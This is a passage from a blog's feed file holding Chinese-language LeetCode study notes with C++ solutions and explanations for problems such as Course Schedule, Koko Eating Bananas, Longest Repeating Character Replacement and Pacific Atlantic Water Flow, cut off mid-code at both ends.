class="line">        <span class="type">int</span> row=<span class="number">0</span>, col=<span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> zig = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c: s)&#123;</span><br><span class="line">            matrix[row]+= c;</span><br><span class="line">            <span class="keyword">if</span>(row==<span class="number">0</span>) zig= <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(row == numRows<span class="number">-1</span>) zig=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(!zig) row++;</span><br><span class="line">            <span class="keyword">else</span> row--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        string result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(string c: matrix)&#123;</span><br><span class="line">            result+=c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告一維陣列長度主要是根據題目指定的列數 <code>numRows</code> 跟字串長度共同決定。 這裡的一為陣列其實會是列數， 因此如果列數小於字串長度，則大小取列數就好，如果列數大於字串長度，則取字串長度就好。</p><p>接著透過一個變數 <code>zig</code> 來表示是否現在是往斜上方走的狀態，一開始為 <code>false</code>，接著我們迭代字串，每次都將字元加入到不同行的 <code>matrix</code> 的字串中，每個字串在填入時，一旦發現當前的 <code>row</code> 抵達最上方 (<code>row==0</code>) 則代表斜走狀態結束，將 <code>zig = false</code> 而一旦發現當前 <code>row</code> 抵達最下面那列，則代表準備要斜走了，將 <code>zig = true</code> 每次迭代中，檢查 <code>zig</code> 是否為 <code>true</code> 如果不為斜走狀態則將列數增加 <code>row++</code> 反之則減少列數 <code>row--</code>。</p><p>迭代結束後，將陣列結果加入到回傳字串中 <code>result</code> 。</p><p>另外處理 Edge Case: 一旦只有要求一列 <code>numRows==1</code> 則代表根本不用Z字型排列，直接回傳字串 <code>s</code> 就好</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/6/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(N)$, $N$ 為字串長度</p><p>空間複雜度</p><p>$O(N)$, $N$ 為字串長度</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>課程表 | Medium | LeetCode#207. Course Schedule</title>
      <link href="/posts/55e11871.html"/>
      <url>/posts/55e11871.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/207/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述：總共有 <code>numCourses</code> 課程需要上，他們被標注為 <code>0</code> - <code>numCourses-1</code>，給定一個陣列 <code>prerequisites</code> 其中 <code>prerequisites[i] = [a_i, b_i]</code> 代表你需要先上過 <code>b_i</code> 課你才夠去上 <code>a_i</code> 課程。舉例來說，<code>[0,1]</code> 代表你需要先上課程 <code>1</code> 才能夠去上課程 <code>0</code>，如果可以完成所有課程就回傳 <code>true</code> 否則回傳 <code>false</code>。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始其實還沒有很懂題意，但在看了題目給的範例後才發現這題，<strong>其實是要在有向圖中找是否有 Cycle</strong> ， 如果看範例二就可以發現他其實就是一個Cycle，並且也會邏輯上不順，<strong>先修課程0再修課程1 跟先修課程1再修課程0 這兩個沒辦法同時成立</strong></p><p><img src="/img/LeetCode/207/cycle.png"></p><blockquote><p>我這裡一樣是透過 DFS 去做，但還沒處理過找Cycle 的題目，因此有看了下Hint，這裡會需要額外的陣列來去保存DFS的呼叫路徑，一旦發現有走訪到走過的路，那就是有Cycle</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;adjMatrix, vector&lt;<span class="type">int</span>&gt; &amp;visited, vector&lt;<span class="type">int</span>&gt; &amp;recStack, <span class="type">int</span> node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[node])&#123;</span><br><span class="line">            visited[node] = <span class="number">1</span>;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">// Add the node to the recursion stack</span></span><br><span class="line">            recStack[node] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> neighbor = <span class="number">0</span>; neighbor &lt; adjMatrix.<span class="built_in">size</span>(); neighbor++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(adjMatrix[node][neighbor] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!visited[neighbor] &amp;&amp; <span class="built_in">dfs</span>(adjMatrix, visited, recStack, neighbor) || recStack[neighbor])&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// cycle detected</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">// Remove the node from the recursion stack</span></span><br><span class="line">        recStack[node] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canFinish</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = numCourses;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">adjMatrix</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(m, <span class="number">0</span>));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">visited</span><span class="params">(m, <span class="number">0</span>)</span></span>; <span class="comment">//0: unvisited</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">recStack</span><span class="params">(m, <span class="number">0</span>)</span></span>; <span class="comment">// 0: not in recursion stack</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// transform prerequisites into adjMatrix</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;prerequisite : prerequisites)&#123;</span><br><span class="line">            adjMatrix[prerequisite[<span class="number">1</span>]][prerequisite[<span class="number">0</span>]] = <span class="number">1</span>; <span class="comment">// Directed edge from prerequisite[1] to prerequisite[0]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check for cycle in the graph</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; m; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!visited[i])&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">dfs</span>(adjMatrix, visited, recStack, i))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>我這裡的做法是，首先我對 <code>prerequisites</code> 陣列不熟悉，所以我希望將它轉換為鄰接矩陣 (Adjacent Matrix)，並且行與列都會是課程Label，有了Adjacent Matrix後，接著透過 DFS 進行走訪，走訪過程中，如果會路過檢查到有 Cycle 則回傳 <code>false</code> 一旦所有未拜訪都的路徑都沒有 cycle 最後則回傳 <code>true</code>。</p></div><p>首先在 <code>canFinish</code> 中，一開始宣告了一個 <code>m x m</code> 大小的鄰接矩陣 <code>adjMatrix</code>，並且後面除了定義 <code>visited</code> 陣列外，還額外宣告一個 <code>recStack</code> 來保存每次的路徑 (Call Stack)，都先初始化為 0。接著需要將題目給的陣列轉成我自己熟悉的鄰接矩陣，由於 <code>prerequisites</code> 中，題目的限制會是，<code>prerequisites[i] = [a_i, b_i]</code>，因此會是從 vertex(B) 指向到 vertex(A)，因此對應到 <code>adjMatrix</code> 中會是 <code>row=vertex(B), column=vertex(A)</code> 那一格會是 <code>1</code>，代表從 vertex(B) 走到 vertex(A) 是有 edge 的。</p><p>透過迴圈建構完畢後，就可以開始迭代走訪每個未造訪過的節點進行DFS 然後檢查是否有 Cycle。走訪跟檢查Cycle 都由 <code>dfs</code> 處理，一旦傳入的節點 <code>node</code> 是尚未造訪過的 (<code>!visited(node)</code>) 則會先去更新對應的狀態:</p><ul><li>標注為「已造訪」 (<code>visited[node] = 1</code>)</li><li>將該節點加入到 call stack (保存路徑) (<code>recStack[node] = 1</code>)</li></ul><p>由於是圖的走訪，因此需要從當前節點檢查鄰接節點是否可以造訪，這裡會是去迭代 <code>adjMatrix</code> 對應 <code>node</code> 行的其他列來去看是否有 edge (<code>adjMatrix[node][neighbor] == 1</code>)，如果有 edge 則需要進一步確認下面條件，如果下面條件成立則代表有 Cycle：</p><ul><li>該 neighbor 尚未被造訪，但以該 neighbor 去遞回呼叫 <code>dfs</code> 會偵測出 cycle</li><li>該 neighbor 已經出現在 call stack 當中 (<code>recStack[neighbor] == 1</code>)</li></ul><p>一旦所有 <code>node</code> 的鄰接節點都沒有檢查出 cycle則代表到目前節點為止都沒有檢查出 cycle，將當前節點移出 call stack (<code>recStack[node] = 0</code>) 並回傳 <code>false</code> (沒有 cycle)。回到 <code>canFinish</code> 如果每個搜尋起點都沒有偵測出 cycle，則最後回傳 <code>true</code> 代表課程可以順利完成。</p><blockquote><p>這裡可以發現，Adjacent Matrix 跟 2D 陣列表示島嶼那種的題目走訪方式不太一樣<br>前者會是去根據當前節點迭代那列對應在鄰接矩陣的不同行，後者會是去走訪當前節點在圖中的上下左右四個方向的節點</p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/207/result.jpeg"></p><blockquote><p><a href="https://leetcode.com/problems/course-schedule/submissions/1513628253/">https://leetcode.com/problems/course-schedule/submissions/1513628253/</a></p></blockquote><h2 id="其他解法-BFS-x2F-Topological-Sort"><a href="#其他解法-BFS-x2F-Topological-Sort" class="headerlink" title="其他解法  -  BFS&#x2F; Topological Sort"></a>其他解法  -  BFS&#x2F; Topological Sort</h2><p>如果一開始的想法，這題是要判斷這是否是一張有向無環圖(Directed Acyclic Graph, DAG) 通常會透過拓樸排序法(Topological Sort) 進行判斷。</p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bclin.tw/2022/01/18/leetcode-207/">https://bclin.tw/2022/01/18/leetcode-207/</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
            <tag> Cycle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KoKo 吃香蕉 | Medium | LeetCode#875. Koko Eating Bananas</title>
      <link href="/posts/7a271795.html"/>
      <url>/posts/7a271795.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/875/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述：Koko 愛吃香蕉，今天有 <code>n</code> 堆的香蕉，第 <code>i</code> 堆香蕉的數量會是 <code>piles[i]</code>，香蕉由守衛看守，守衛目前不在，但他會在 <code>h</code> 小時候回來。Koko 每小時吃香蕉的速度會是 <code>k</code>，每一小時 Koko 會去挑選一堆香蕉吃，如果某堆香蕉的數量小於 <code>k</code> 則Koko 會將它們全吃掉，並且在那一小時中不會再去吃其他堆香蕉。雖然 Koko 吃的很慢，但是他還是希望在守衛回來前將所有的香蕉都吃完，為了達到這個目的，Koko 每小時吃香蕉的速度 <code>k</code> 最小會是多少？</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始還在想要怎麼樣決定<code>k</code>，這裡可以透過 Binary Search 的方式去將不同堆的元素作為 <code>k</code> 去嘗試，嘗試的方式就是將每堆元素扣除 K 直到變成 0，同時記錄時數，只要最終時數小於 <code>h</code> 則回傳 <code>k</code> 值，只要最終時數大於 <code>h</code> 則繼續透過二元法找其他的 <code>k</code></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minEatingSpeed</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; piles, <span class="type">int</span> h)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> left=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> right = *<span class="built_in">max_element</span>(piles.<span class="built_in">begin</span>(), piles.<span class="built_in">end</span>()); </span><br><span class="line">        <span class="type">int</span> result = right;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="type">int</span> k = left + (right-left) /<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">canFinish</span>(piles, h, k))&#123;</span><br><span class="line">                    result = k;</span><br><span class="line">                    right = k<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    left = k+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canFinish</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;piles, <span class="type">int</span> h, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> hours = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; piles.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">                    hours += (piles[i]  + k <span class="number">-1</span>) / k;</span><br><span class="line">                    <span class="keyword">if</span>(hours &gt; h) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡將二元法和確認所選 <code>k</code> 值是否有效，分成兩個函數 <code>minEatingSpeed</code> 和 <code>canFinish</code>。在 <code>minEatingSpeed</code> 的部分，由於Koko 每小時至少會吃一根香蕉，因此<code>left</code> 設定為 1， 這裡在 binary search 的時候設定的右界會是元素中的最大值， <strong>這裡透過 <code>&lt;algorithm&gt;</code> 中提供的 <code>*max_element</code> 方法來去獲取容器中的最大值</strong> ， 其效果等同於 (先 <code>sort(piles.begin(), piles.end());</code> 再 <code>int right = piles[piles.size()-1]</code> 但這樣效率較低)。</p><p>接著透過 binary search 的方式在 <code>1</code> 和 piles中最大元素值 <code>right</code> 當中尋找可能的 <code>k</code> 值，這裡就先中中間值開始找，接著就要去判斷 <code>k</code> 是否為有效的吃香蕉速度，需要呼叫 <code>canFinish</code>  來進行確認。 在 <code>canFliish</code>  中透過變數 <code>long long hours</code>  來去累加給定 <code>k</code> 速度吃香蕉，最終會花費的時間。 </p><p><strong>這裡透過一個向上取整公式來去知道特定堆 <code>i</code> 香蕉會花費的時間</strong> 為 $(\text{pile} + k -1)&#x2F;k$ </p><div class="note info flat"><p>其實就是取Ceil，如果今天有個整數a 和 b，則向上取整 $\frac{a}{b} &#x3D; \frac{a+b-1}{b}$<br>也可以先透過取 mod 後是否為0 來去判斷除完後是否要加一，但這樣就比較麻煩</p></div><p>累加完畢後如果 <code>hours &gt; h</code> 則代表這個 <code>k</code> 不能用，會被守衛抓到，因此 return <code>false</code>，一旦檢查過程都沒 <code>false</code> 就回傳 <code>true</code>。回到 <code>minEatingSpeed</code> 中，如果 <code>k</code>值有效，那就將 <code>k</code> 丟給 <code>result</code> 並且將 <code>right</code> 收窄成 <code>k-1</code> 繼續找可能最小的 <code>k</code> 值。如果 <code>k</code> 值無效，則收窄左邊 <code>left</code> 如此下來，最終能找到最小的 <code>k</code> 值返回。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/875/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O(n \cdot log(n))$</p><p>空間複雜度</p><p>$O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>替換後的最長重複字元 | Medium | LeetCode#424. Longest Repeating Character Replacement</title>
      <link href="/posts/1717ddff.html"/>
      <url>/posts/1717ddff.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/424/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 給定一個字串 <code>s</code> 以及整數 <code>k</code> ，題目要求我們需要去將 <code>s</code> 中的任意字元替換成其他英文大寫字母，這樣的替換操作可以進行 <code>k</code> 次，在進行 <code>k</code> 次操做後，請回傳具有相同字母的最長的子字串</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>對於關鍵字，最長子字串，可以直接聯想到要使用 Sliding Window，但這題除了找到子字串之外，還需要透過 Hash Table 來去紀錄個別字母的出現頻率，同時在滑動窗口的同時需要紀錄最大長度。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">characterReplacement</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; umap;</span><br><span class="line">        <span class="type">int</span> maxFreq = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> maxLength = <span class="number">0</span>;</span><br><span class="line">        string tempStr = s;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> right=<span class="number">0</span>; right&lt;s.<span class="built_in">length</span>();right++)&#123;</span><br><span class="line">            umap[s[right]]++;</span><br><span class="line">            maxFreq = <span class="built_in">max</span>(maxFreq, umap[s[right]]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>((right - left +<span class="number">1</span>) - maxFreq &gt; k )&#123;</span><br><span class="line">                umap[s[left]]--;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            maxLength = <span class="built_in">max</span>(maxLength, right-left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡的 Hash Table <code>unordered_map&lt;char, int&gt;</code>  <strong>主要用於儲存子字串中的個別字母出現頻率</strong> ， 這裡還額外初始化了兩個變數 <code>maxFreq</code> 以及 <code>maxLength</code> 分別用來儲存，子字串中出現最高頻率字母的個數，以及最長子字串的長度。 </p><p>這裡也先將左指針 <code>left</code> 歸零，透過 for 迴圈來去移動右指針 <code>right</code> ，每次移動右指針，<code>umap</code> 中對應字元的出現次數就增加 (<code>umap[s[right]]++</code>)，並且每到一個字母就去取出當前最高頻率的字母的次數 (<code>maxFreq = max(maxFreq, umap[s[right]])</code>)，這個 <code>maxFreq</code> 的目的在於，如果窗口中的元素，在進行 <code>k</code> 次替換後還有剩餘元素，這樣就需要去把窗口收窄，因此如果在迴圈中發現當前窗口大小 <code>right-left+1</code> 在扣掉最高頻率字母的個數 <code>maxFreq</code> 後，仍然比 <code>k</code> 還要大，那這時候就需要將窗口收窄，收窄的行為會包含： </p><p>(1) 更新 <code>umap</code>，因為它代表當前窗口底下不同字母的出現次數<br>(2) 更新左指針。</p><p>每次移動右指針中，如果窗口大小調整適當，則會去與當前最長子字串長度 <code>maxLength</code> 進行比較 (<code>maxLength = max(maxLength, right-left+1)</code>)，全部結束後就回傳最長子字串長度。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/424/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(n)$ &#x3D; $O(n)$ + $O(n)$ : 左右指針都只會便字串一次。每個指針最多移動 $n$ 次</p><p>空間複雜度</p><p>$O(1)$: Hash Table 僅會記錄大寫英文字母，因此為 $O(26)$ &#x3D; $O(1)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Hash Table </tag>
            
            <tag> Sliding Window </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>太平洋-大西洋水流 | Medium | LeetCode#417. Pacific Atlantic Water Flow</title>
      <link href="/posts/7fd7eb24.html"/>
      <url>/posts/7fd7eb24.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/417/question1.jpeg"></p><p><img src="/img/LeetCode/417/question2.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 有個大小 <code>m x n</code> 的長方形島嶼，它的邊界被太平洋與大西洋包圍。與太平洋交界的會是島嶼的上方以及左側邊緣，與大西洋交界的會是島嶼的下方和右側邊緣。島嶼被切分成許多網格單元，可以視為一個 <code>m x n</code> 大小的矩陣 <code>heights</code>，其中 <code>heights[r][c]</code> 代表座標 <code>(r,c)</code> 位置的海拔高度。 島上很常下雨， <strong>只要當前單元格的海拔高度大於或等於其上下左右單元格的海拔高度，則雨水可以自由流向他的上下左右單元格。</strong> 雨水可以透過相鄰單元格一路流到海洋中。 題目要求回傳一個 2D 矩陣 <code>result</code>， 其中 <code>result[i] = [r_i, c_i]</code> 代表雨水可以從座標 <code>(r_i, c_i)</code> <strong>同時流到太平洋與大西洋。</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始覺得這題一樣會是 connected components 只是 connected 的條件變成只要四周格子比當前格子小，就能 connected，但沒有好好想到要如何同時滿足流向大西洋以及太平洋，並且要怎麼挑選走訪時候的起始點。</p><blockquote><p>後來看了提示後發現，可以 <strong>反向模擬水流流向</strong>，也就是個別從大西洋的邊以及太平洋的邊去進行BFS，並且將個別BFS造訪過的單元格進行標注，最後將兩個結果取交集，就會是可以同時流向太平洋以及搭西洋的單元格。</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&amp; q, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;heights, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; &amp;ocean)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> offsetRow[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> offsetCol[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; current = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span 